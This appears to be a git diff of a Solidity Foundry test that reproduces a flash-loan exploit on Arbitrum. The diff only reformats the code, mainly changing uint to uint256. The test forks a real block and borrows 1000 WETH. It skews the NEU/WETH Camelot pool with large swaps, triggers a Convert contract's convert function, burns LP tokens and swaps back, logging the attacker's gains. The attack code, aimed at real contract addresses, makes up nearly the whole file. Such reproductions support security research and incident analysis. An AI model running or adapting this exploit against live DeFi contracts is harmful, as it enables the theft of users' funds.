@@ -26,136 +26,124 @@ interface IUniswapV2Router01 {
     function addLiquidity(
         address tokenA,
         address tokenB,
-        uint amountADesired,
-        uint amountBDesired,
-        uint amountAMin,
-        uint amountBMin,
+        uint256 amountADesired,
+        uint256 amountBDesired,
+        uint256 amountAMin,
+        uint256 amountBMin,
         address to,
-        uint deadline
-    ) external returns (uint amountA, uint amountB, uint liquidity);
+        uint256 deadline
+    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);
 
     function addLiquidityETH(
         address token,
-        uint amountTokenDesired,
-        uint amountTokenMin,
-        uint amountETHMin,
+        uint256 amountTokenDesired,
+        uint256 amountTokenMin,
+        uint256 amountETHMin,
         address to,
-        uint deadline
-    )
-        external
-        payable
-        returns (uint amountToken, uint amountETH, uint liquidity);
+        uint256 deadline
+    ) external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
 
     function removeLiquidity(
         address tokenA,
         address tokenB,
-        uint liquidity,
-        uint amountAMin,
-        uint amountBMin,
+        uint256 liquidity,
+        uint256 amountAMin,
+        uint256 amountBMin,
         address to,
-        uint deadline
-    ) external returns (uint amountA, uint amountB);
+        uint256 deadline
+    ) external returns (uint256 amountA, uint256 amountB);
 
     function removeLiquidityETH(
         address token,
-        uint liquidity,
-        uint amountTokenMin,
-        uint amountETHMin,
+        uint256 liquidity,
+        uint256 amountTokenMin,
+        uint256 amountETHMin,
         address to,
-        uint deadline
-    ) external returns (uint amountToken, uint amountETH);
+        uint256 deadline
+    ) external returns (uint256 amountToken, uint256 amountETH);
 
     function removeLiquidityWithPermit(
         address tokenA,
         address tokenB,
-        uint liquidity,
-        uint amountAMin,
-        uint amountBMin,
+        uint256 liquidity,
+        uint256 amountAMin,
+        uint256 amountBMin,
         address to,
-        uint deadline,
+        uint256 deadline,
         bool approveMax,
         uint8 v,
         bytes32 r,
         bytes32 s
-    ) external returns (uint amountA, uint amountB);
+    ) external returns (uint256 amountA, uint256 amountB);
 
     function removeLiquidityETHWithPermit(
         address token,
-        uint liquidity,
-        uint amountTokenMin,
-        uint amountETHMin,
+        uint256 liquidity,
+        uint256 amountTokenMin,
+        uint256 amountETHMin,
         address to,
-        uint deadline,
+        uint256 deadline,
         bool approveMax,
         uint8 v,
         bytes32 r,
         bytes32 s
-    ) external returns (uint amountToken, uint amountETH);
+    ) external returns (uint256 amountToken, uint256 amountETH);
 
-    function quote(
-        uint amountA,
-        uint reserveA,
-        uint reserveB
-    ) external pure returns (uint amountB);
+    function quote(uint256 amountA, uint256 reserveA, uint256 reserveB) external pure returns (uint256 amountB);
 }
 
 interface ICamelotRouter is IUniswapV2Router01 {
     function removeLiquidityETHSupportingFeeOnTransferTokens(
         address token,
-        uint liquidity,
-        uint amountTokenMin,
-        uint amountETHMin,
+        uint256 liquidity,
+        uint256 amountTokenMin,
+        uint256 amountETHMin,
         address to,
-        uint deadline
-    ) external returns (uint amountETH);
+        uint256 deadline
+    ) external returns (uint256 amountETH);
 
     function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
         address token,
-        uint liquidity,
-        uint amountTokenMin,
-        uint amountETHMin,
+        uint256 liquidity,
+        uint256 amountTokenMin,
+        uint256 amountETHMin,
         address to,
-        uint deadline,
+        uint256 deadline,
         bool approveMax,
         uint8 v,
         bytes32 r,
         bytes32 s
-    ) external returns (uint amountETH);
+    ) external returns (uint256 amountETH);
 
     function swapExactTokensForTokensSupportingFeeOnTransferTokens(
-        uint amountIn,
-        uint amountOutMin,
+        uint256 amountIn,
+        uint256 amountOutMin,
         address[] calldata path,
         address to,
         address referrer,
-        uint deadline
+        uint256 deadline
     ) external;
 
     function swapExactETHForTokensSupportingFeeOnTransferTokens(
-        uint amountOutMin,
+        uint256 amountOutMin,
         address[] calldata path,
         address to,
         address referrer,
-        uint deadline
+        uint256 deadline
     ) external payable;
 
     function swapExactTokensForETHSupportingFeeOnTransferTokens(
-        uint amountIn,
-        uint amountOutMin,
+        uint256 amountIn,
+        uint256 amountOutMin,
         address[] calldata path,
         address to,
         address referrer,
-        uint deadline
+        uint256 deadline
     ) external;
 }
 
 interface ICamelotFactory {
-    event PairCreated(
-        address indexed token0,
-        address indexed token1,
-        address pair,
-        uint256
-    );
+    event PairCreated(address indexed token0, address indexed token1, address pair, uint256);
 
     function owner() external view returns (address);
 
@@ -169,31 +157,22 @@ interface ICamelotFactory {
 
     function referrersFeeShare(address) external view returns (uint256);
 
-    function getPair(
-        address tokenA,
-        address tokenB
-    ) external view returns (address pair);
+    function getPair(address tokenA, address tokenB) external view returns (address pair);
 
     function allPairs(uint256) external view returns (address pair);
 
     function allPairsLength() external view returns (uint256);
 
-    function createPair(
-        address tokenA,
-        address tokenB
-    ) external returns (address pair);
+    function createPair(address tokenA, address tokenB) external returns (address pair);
 
     function setFeeTo(address) external;
 
-    function feeInfo()
-        external
-        view
-        returns (uint _ownerFeeShare, address _feeTo);
+    function feeInfo() external view returns (uint256 _ownerFeeShare, address _feeTo);
 }
 
 interface ICamelotPair {
-    event Approval(address indexed owner, address indexed spender, uint value);
-    event Transfer(address indexed from, address indexed to, uint value);
+    event Approval(address indexed owner, address indexed spender, uint256 value);
+    event Transfer(address indexed from, address indexed to, uint256 value);
 
     function name() external pure returns (string memory);
 
@@ -201,59 +180,47 @@ interface ICamelotPair {
 
     function decimals() external pure returns (uint8);
 
-    function totalSupply() external view returns (uint);
+    function totalSupply() external view returns (uint256);
 
-    function balanceOf(address owner) external view returns (uint);
+    function balanceOf(address owner) external view returns (uint256);
 
-    function allowance(
-        address owner,
-        address spender
-    ) external view returns (uint);
+    function allowance(address owner, address spender) external view returns (uint256);
 
-    function approve(address spender, uint value) external returns (bool);
+    function approve(address spender, uint256 value) external returns (bool);
 
-    function transfer(address to, uint value) external returns (bool);
+    function transfer(address to, uint256 value) external returns (bool);
 
-    function transferFrom(
-        address from,
-        address to,
-        uint value
-    ) external returns (bool);
+    function transferFrom(address from, address to, uint256 value) external returns (bool);
 
     function DOMAIN_SEPARATOR() external view returns (bytes32);
 
     function PERMIT_TYPEHASH() external pure returns (bytes32);
 
-    function nonces(address owner) external view returns (uint);
+    function nonces(address owner) external view returns (uint256);
 
     function permit(
         address owner,
         address spender,
-        uint value,
-        uint deadline,
+        uint256 value,
+        uint256 deadline,
         uint8 v,
         bytes32 r,
         bytes32 s
     ) external;
 
-    event Mint(address indexed sender, uint amount0, uint amount1);
-    event Burn(
-        address indexed sender,
-        uint amount0,
-        uint amount1,
-        address indexed to
-    );
+    event Mint(address indexed sender, uint256 amount0, uint256 amount1);
+    event Burn(address indexed sender, uint256 amount0, uint256 amount1, address indexed to);
     event Swap(
         address indexed sender,
-        uint amount0In,
-        uint amount1In,
-        uint amount0Out,
-        uint amount1Out,
+        uint256 amount0In,
+        uint256 amount1In,
+        uint256 amount0Out,
+        uint256 amount1Out,
         address indexed to
     );
     event Sync(uint112 reserve0, uint112 reserve1);
 
-    function MINIMUM_LIQUIDITY() external pure returns (uint);
+    function MINIMUM_LIQUIDITY() external pure returns (uint256);
 
     function factory() external view returns (address);
 
@@ -264,43 +231,21 @@ interface ICamelotPair {
     function getReserves()
         external
         view
-        returns (
-            uint112 reserve0,
-            uint112 reserve1,
-            uint16 token0feePercent,
-            uint16 token1FeePercent
-        );
+        returns (uint112 reserve0, uint112 reserve1, uint16 token0feePercent, uint16 token1FeePercent);
 
-    function getAmountOut(
-        uint amountIn,
-        address tokenIn
-    ) external view returns (uint);
+    function getAmountOut(uint256 amountIn, address tokenIn) external view returns (uint256);
 
-    function kLast() external view returns (uint);
+    function kLast() external view returns (uint256);
 
-    function setFeePercent(
-        uint16 token0FeePercent,
-        uint16 token1FeePercent
-    ) external;
+    function setFeePercent(uint16 token0FeePercent, uint16 token1FeePercent) external;
 
-    function mint(address to) external returns (uint liquidity);
+    function mint(address to) external returns (uint256 liquidity);
 
-    function burn(address to) external returns (uint amount0, uint amount1);
+    function burn(address to) external returns (uint256 amount0, uint256 amount1);
 
-    function swap(
-        uint amount0Out,
-        uint amount1Out,
-        address to,
-        bytes calldata data
-    ) external;
+    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
 
-    function swap(
-        uint amount0Out,
-        uint amount1Out,
-        address to,
-        bytes calldata data,
-        address referrer
-    ) external;
+    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data, address referrer) external;
 
     function skim(address to) external;
 
@@ -318,16 +263,13 @@ contract CounterTest is Test {
     IERC20 WETH = IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
     IERC20 NEU = IERC20(0xdA51015b73cE11F77A115Bb1b8a7049e02dDEcf0);
     IERC20 NEU1 = IERC20(0x6609BE1547166D1C4605F3A243FDCFf467e600C3);
-    ICamelotRouter CamelotRouter =
-        ICamelotRouter(0xc873fEcbd354f5A56E00E710B90EF4201db2448d);
+    ICamelotRouter CamelotRouter = ICamelotRouter(0xc873fEcbd354f5A56E00E710B90EF4201db2448d);
     IConvert convert = IConvert(0xdbd3d6040f87A9F822839Cb31195Ad25C2D0D54d);
-    ICamelotPair CamelotPair0 =
-        ICamelotPair(0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440);
-    ICamelotPair CamelotPair1 =
-        ICamelotPair(0x2ea3CA79413C2EC4C1893D5f8C34C16acB2288A4);
+    ICamelotPair CamelotPair0 = ICamelotPair(0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440);
+    ICamelotPair CamelotPair1 = ICamelotPair(0x2ea3CA79413C2EC4C1893D5f8C34C16acB2288A4);
 
     function setUp() public {
-        vm.createSelectFork("arbitrum", 117189138);
+        vm.createSelectFork("arbitrum", 117_189_138);
         vm.label(address(WETH), "WETH");
         vm.label(address(NEU), "NEU");
     }
@@ -335,16 +277,11 @@ contract CounterTest is Test {
     function test() public {
         console.log("Attacker's WETH token balance: ", WETH.balanceOf(address(this)));
         IERC20[] memory tokens = new IERC20[](1);
-        uint[] memory amount = new uint[](1);
+        uint256[] memory amount = new uint[](1);
         tokens[0] = WETH;
         amount[0] = 1000 ether;
         bytes memory userdata;
-        valut.flashLoan(
-            IFlashLoanRecipient(address(this)),
-            tokens,
-            amount,
-            userdata
-        );
+        valut.flashLoan(IFlashLoanRecipient(address(this)), tokens, amount, userdata);
     }
 
     function receiveFlashLoan(
@@ -354,83 +291,58 @@ contract CounterTest is Test {
         bytes memory userData
     ) external {
         console.log("After flashloan attacker's WETH token balance: ", WETH.balanceOf(address(this)));
-        WETH.approve(address(CamelotRouter), type(uint).max);
+        WETH.approve(address(CamelotRouter), type(uint256).max);
         ICamelotFactory factoryAddr = ICamelotFactory(CamelotRouter.factory());
         console.log("Factory Address: ", address(factoryAddr));
-        CamelotPair0 = ICamelotPair(
-            factoryAddr.getPair(address(WETH), address(NEU))
-        );
+        CamelotPair0 = ICamelotPair(factoryAddr.getPair(address(WETH), address(NEU)));
         console.log("CMLT-LP0 addresss: ", address(CamelotPair0));
-        console.log(
-            "CMLT-LP0 addresss: ",
-            factoryAddr.getPair(address(WETH), address(NEU))
-        );
+        console.log("CMLT-LP0 addresss: ", factoryAddr.getPair(address(WETH), address(NEU)));
         address tokenA = CamelotPair0.token0();
         address tokenB = CamelotPair0.token1();
         address[] memory path = new address[](2);
         path[0] = tokenA;
         path[1] = tokenB;
         CamelotRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            0.15 ether,
-            0,
-            path,
-            address(this),
-            address(this),
-            block.timestamp + 30 minutes
+            0.15 ether, 0, path, address(this), address(this), block.timestamp + 30 minutes
         );
         console.log("swap token [WETH,NEU] 0.15 WETH -> NEU");
-        uint neuAmount = NEU.balanceOf(address(this));
+        uint256 neuAmount = NEU.balanceOf(address(this));
         console.log("Attacker's NEU token balance: ", neuAmount);
         NEU.approve(address(CamelotRouter), neuAmount);
-        uint lpAmount0 = CamelotPair0.balanceOf(address(this));
+        uint256 lpAmount0 = CamelotPair0.balanceOf(address(this));
         console.log("Balance of Attacker in CMLT-LP0: ", lpAmount0);
         CamelotRouter.addLiquidity(
-            tokenA,
-            tokenB,
-            0.15 ether,
-            neuAmount,
-            0,
-            0,
-            address(this),
-            block.timestamp + 30 minutes
+            tokenA, tokenB, 0.15 ether, neuAmount, 0, 0, address(this), block.timestamp + 30 minutes
         );
         lpAmount0 = CamelotPair0.balanceOf(address(this));
-        console.log(
-            "Balance of Attacker in CMLT-LP0 after addLiquidity: ",
-            lpAmount0
-        );
-        CamelotPair0.approve(address(convert), type(uint).max);
-        uint cvAmount = CamelotPair1.balanceOf(address(convert));
+        console.log("Balance of Attacker in CMLT-LP0 after addLiquidity: ", lpAmount0);
+        CamelotPair0.approve(address(convert), type(uint256).max);
+        uint256 cvAmount = CamelotPair1.balanceOf(address(convert));
         console.log("Balance of Convert in CMLT-LP1: ", cvAmount);
-        (uint lp0_reserve0, uint lp0_reserve1, , ) = CamelotPair0.getReserves();
+        (uint256 lp0_reserve0, uint256 lp0_reserve1,,) = CamelotPair0.getReserves();
         console.log("LP0 reserve0 amount: ", lp0_reserve0);
         console.log("LP0 reserve1 amount: ", lp0_reserve1);
-        (uint lp1_reserve0, uint lp1_reserve1, , ) = CamelotPair1.getReserves();
+        (uint256 lp1_reserve0, uint256 lp1_reserve1,,) = CamelotPair1.getReserves();
         console.log("LP1 reserve0 amount: ", lp1_reserve0);
         console.log("LP1 reserve1 amount: ", lp1_reserve1);
-        uint lp0_totalsupply = CamelotPair0.totalSupply();
+        uint256 lp0_totalsupply = CamelotPair0.totalSupply();
         console.log("LP0 totalSupply amount: ", lp0_totalsupply);
-        uint lp1_totalsupply = CamelotPair1.totalSupply();
+        uint256 lp1_totalsupply = CamelotPair1.totalSupply();
         console.log("LP1 totalSupply amount: ", lp1_totalsupply);
         neuAmount = NEU.balanceOf(address(this));
         console.log("Attacker's NEU token balance: ", neuAmount);
         CamelotRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            849 ether,
-            0,
-            path,
-            address(this),
-            address(this),
-            block.timestamp + 30 minutes
+            849 ether, 0, path, address(this), address(this), block.timestamp + 30 minutes
         );
         console.log("swap token [WETH,NEU] 849 WETH -> NEU");
         neuAmount = NEU.balanceOf(address(this));
         console.log("Attacker's NEU token balance: ", neuAmount);
-        uint wethAmount = WETH.balanceOf(address(this));
+        uint256 wethAmount = WETH.balanceOf(address(this));
         console.log("Attacker's WETH token balance: ", wethAmount);
-        (lp0_reserve0, lp0_reserve1, , ) = CamelotPair0.getReserves();
+        (lp0_reserve0, lp0_reserve1,,) = CamelotPair0.getReserves();
         console.log("LP0 reserve0 amount: ", lp0_reserve0);
         console.log("LP0 reserve1 amount: ", lp0_reserve1);
-        (lp1_reserve0, lp1_reserve1, , ) = CamelotPair1.getReserves();
+        (lp1_reserve0, lp1_reserve1,,) = CamelotPair1.getReserves();
         console.log("LP1 reserve0 amount: ", lp1_reserve0);
         console.log("LP1 reserve1 amount: ", lp1_reserve1);
         convert.convert(lpAmount0);
@@ -439,49 +351,39 @@ contract CounterTest is Test {
         console.log("Attacker's NEU token balance: ", neuAmount);
         wethAmount = WETH.balanceOf(address(this));
         console.log("Attacker's WETH token balance: ", wethAmount);
-        NEU.approve(address(CamelotRouter), type(uint).max);
+        NEU.approve(address(CamelotRouter), type(uint256).max);
         address[] memory path1 = new address[](2);
         path1[0] = tokenB;
         path1[1] = tokenA;
         CamelotRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            neuAmount,
-            0,
-            path1,
-            address(this),
-            address(this),
-            block.timestamp + 30 minutes
+            neuAmount, 0, path1, address(this), address(this), block.timestamp + 30 minutes
         );
         console.log("swap token [NEU,WETH]");
         wethAmount = WETH.balanceOf(address(this));
         console.log("Attacker's WETH token balance: ", wethAmount);
-        uint lpAmount1 = CamelotPair1.balanceOf(address(this));
+        uint256 lpAmount1 = CamelotPair1.balanceOf(address(this));
         console.log("Balance of Attacker in CMLT-LP1: ", lpAmount1);
         CamelotPair1.transfer(address(CamelotPair1), lpAmount1);
-        (uint amount0, uint amount1) = CamelotPair1.burn(address(this));
+        (uint256 amount0, uint256 amount1) = CamelotPair1.burn(address(this));
         console.log("CMLT-LP1 burn amount: ", amount0, amount1);
-        uint neu1Amount = NEU1.balanceOf(address(this));
+        uint256 neu1Amount = NEU1.balanceOf(address(this));
         console.log("Attacker's NEU1 token balance: ", neu1Amount);
         wethAmount = WETH.balanceOf(address(this));
         console.log("Attacker's WETH token balance: ", wethAmount);
         address[] memory path2 = new address[](2);
         path2[0] = address(NEU1);
         path2[1] = address(WETH);
-        NEU1.approve(address(CamelotRouter), type(uint).max);
+        NEU1.approve(address(CamelotRouter), type(uint256).max);
         CamelotRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            neu1Amount,
-            0,
-            path2,
-            address(this),
-            address(this),
-            block.timestamp + 30 minutes
+            neu1Amount, 0, path2, address(this), address(this), block.timestamp + 30 minutes
         );
         console.log("swap token [NEU1,WETH]");
         wethAmount = WETH.balanceOf(address(this));
         console.log("Attacker's WETH token balance: ", wethAmount);
-        (lp0_reserve0, lp0_reserve1, , ) = CamelotPair0.getReserves();
+        (lp0_reserve0, lp0_reserve1,,) = CamelotPair0.getReserves();
         console.log("LP0 reserve0 amount: ", lp0_reserve0);
         console.log("LP0 reserve1 amount: ", lp0_reserve1);
-        (lp1_reserve0, lp1_reserve1, , ) = CamelotPair1.getReserves();
+        (lp1_reserve0, lp1_reserve1,,) = CamelotPair1.getReserves();
         console.log("LP1 reserve0 amount: ", lp1_reserve0);
         console.log("LP1 reserve1 amount: ", lp1_reserve1);
         WETH.transfer(address(valut), 1000 ether);
